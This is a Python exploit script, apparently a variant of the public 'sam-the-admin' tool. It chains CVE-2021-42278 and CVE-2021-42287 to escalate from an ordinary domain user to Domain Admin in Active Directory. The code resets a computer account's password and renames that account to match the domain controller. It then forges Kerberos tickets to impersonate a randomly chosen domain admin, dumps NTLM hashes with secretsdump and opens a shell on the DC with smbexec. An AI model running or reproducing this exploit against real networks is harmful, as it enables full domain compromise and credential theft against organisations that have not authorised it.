from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials


import argparse
import logging
import sys
import string
import random
import ssl
import os
from binascii import unhexlify
import ldapdomaindump
import ldap3
import time
import re

from utils.helper import *
from utils.addcomputer import AddComputerSAMR
from utils.S4U2self import GETST
from utils import smbresetpasswd

characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")


def samtheadmin(username, password, domain, options):

    domain, username, password, lmhash, nthash = parse_identity(options)
    ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)

    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
    
    
    rootsid = domain_dumper.getRootSid()
    dcinfo = get_dc_host(ldap_session, domain_dumper)
    if not len(dcinfo['name']):
        logging.critical("Cannot get domain info")
        exit()
    dc_host = dcinfo['name'][0].lower()
    dcfull = dcinfo['dNSHostName'][0].lower()

    logging.info(f'Selected Target {dcfull}')
    domainAdmins = get_domain_admins(ldap_session, domain_dumper)
    random_domain_admin = random.choice(domainAdmins)
    logging.info(f'Total Domain Admins {len(domainAdmins)}')
    logging.info(f'will try to impersonat {random_domain_admin}')

    # MachineAccountQuota
    for i in domain_dumper.getDomainPolicy():
        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))
    if MachineAccountQuota < 0 or MachineAccountQuota == 0:
        logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')


    # Choosing a computer
    dn = get_user_info(username, ldap_session, domain_dumper)
    if dn:
        objectSid = str(dn['attributes']['objectSid'][0])
        logging.info(f'Current user {username}\'s objectSid is {objectSid}' )
    else:
        logging.error(f'Cannot find current user {username}')
    
    computers = get_computers(objectSid, ldap_session, domain_dumper)
    logging.info(f'User {username}\'s domain computers : {computers}')
    random_domain_computer = random.choice(computers)
    new_computer_name = random_domain_computer
    new_computer_name_full = new_computer_name.split('$')[0] + '.' + domain 
    new_computer_password = 'P@ssw0rd4321'
    logging.info(f'will try to exploit through {random_domain_computer}')

    # reset the pass
    logging.info(f'Reseting the password of {new_computer_name} into P@ssw0rd4321...')
    resetpasswd = smbresetpasswd.SamrResetPassword(username=username, password=password, dc_ip=options.dc_ip)
    resetpasswd.reset_password(user=new_computer_name, newpassword=new_computer_password)
    logging.info(f'Successfully reset {new_computer_name}\'s password')

    # clear spn
    spns = get_spn(new_computer_name, ldap_session, domain_dumper)['attributes']['servicePrincipalName']
    logging.info(f'{new_computer_name}\'s spn found:')
    for spn in spns:
        print(f'        {spn}')
    logging.info("Clearing the spns...")
    clear_spn(new_computer_name, ldap_session, domain_dumper)
    logging.info('Successfully clear the spns')
    # spns = get_spn(new_computer_name, ldap_session, domain_dumper)['attributes']['servicePrincipalName']
    # logging.info(f'{new_computer_name}\'s spn found:')
    # for spn in spns:
    #     print(f'        {spn}')

    # CVE-2021-42278
    new_machine_dn = None
    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn:
        new_machine_dn = str(dn['dn'])
        logging.info(f'{new_computer_name} object = {new_machine_dn}')

    if new_machine_dn:
        ldap_session.modify(new_machine_dn, {'sAMAccountName': [ldap3.MODIFY_REPLACE, [dc_host]]})
        if ldap_session.result['result'] == 0:
            logging.info(f'{new_computer_name} sAMAccountName == {dc_host}')
        else:
            logging.error('Cannot rename the machine account , target patched')
            exit()


    # Getting a ticket
    getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
    getting_tgt.run()
    dcticket = str(dc_host + '.ccache')



    # Restoring Old Values
    logging.info(f"Resting the machine account to {new_computer_name}")
    dn = get_user_info(dc_host, ldap_session, domain_dumper)
    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
    if ldap_session.result['result'] == 0:
        logging.info(f'Restored {new_computer_name} sAMAccountName to original value')
    else:
        logging.error('Cannot restore the old name lol')



    # recover spn
    logging.info("Recovering the spns...")
    add_spn(new_computer_name, spns, ldap_session, domain_dumper)
    logging.info('Successfully recover the spns')


    os.environ["KRB5CCNAME"] = dcticket
    executer = GETST(None, None, domain, options,
        impersonate_target=random_domain_admin,
        target_spn=f"cifs/{dcfull}")
    executer.run()


    adminticket = str(random_domain_admin + '.ccache')
    os.environ["KRB5CCNAME"] = adminticket

    # get Domain Admin hash
    fbinary = "python3 utils/secretsdump.py"
    getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass -just-dc-user '{random_domain_admin}' @'{dcfull}'"
    ntlm_hash = re.findall(r'[a-fA-F\d]{32}:[a-fA-F\d]{32}', re.findall(r'\:?(.*?)\:\:\:', os.popen(getashell).read())[0])[0]
    logging.info(f"Getting the {random_domain_admin}\'s ntlm hash: {ntlm_hash}")
    logging.info(f"Trying to recover the ntlm for {new_computer_name}")
    input_text = str(input(f"Pls input the IP of {new_computer_name}："))
    new_computer_name_ip = re.findall(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b', input_text)[0]
    recoverthehash = f"{fbinary} -target-ip {new_computer_name_ip} -hashes '{ntlm_hash}' '{domain}/{random_domain_admin}'@'{new_computer_name_full}'"
    try:
        logging.info(f"Getting the {new_computer_name}\'s hash ... ")
        logging.info("May take a few seconds ... Wait...")
        ntlm_new_computer_name = re.findall(r'[a-fA-F\d]{32}:[a-fA-F\d]{32}', re.findall(r'\:?(.*?)\:\:\:', os.popen(recoverthehash).read())[-1])[0]
        logging.info(f"Getting the {new_computer_name}\'s ntlm hash: {ntlm_new_computer_name}")
        logging.info(f"Recovering the ntlm for {new_computer_name}")
        resetpasswd = smbresetpasswd.SamrResetPassword(username=username, password=password, dc_ip=options.dc_ip)
        resetpasswd.reset_password(user=new_computer_name, newhashes=ntlm_new_computer_name)
        logging.info(f'Successfully reset {new_computer_name}\'s password')
    except:
        logging.error(f"Something seems wrong AND YOU SHOULD RECOVER THE NTLM FOR {new_computer_name} by YOURSELF!!")
        
    


    # will do something else later on 
    fbinary = "python3 utils/smbexec.py"
    if options.dump:
        fbinary = "python3 utils/secretsdump.py"

    getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                    "
    os.system(getashell)

    # os.system("rm *.ccache")


if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print((version.BANNER))

    parser = argparse.ArgumentParser(add_help = True, description = "SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")

    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')

    parser.add_argument('-port', type=int, choices=[139, 445, 636],
                       help='Destination port to connect to. SAMR defaults to 445, LDAPS to 636.')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on account parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')
    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')




    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    try:
        if domain is None or domain == '':
            logging.critical('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True


        samtheadmin(username, password, domain, options)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))

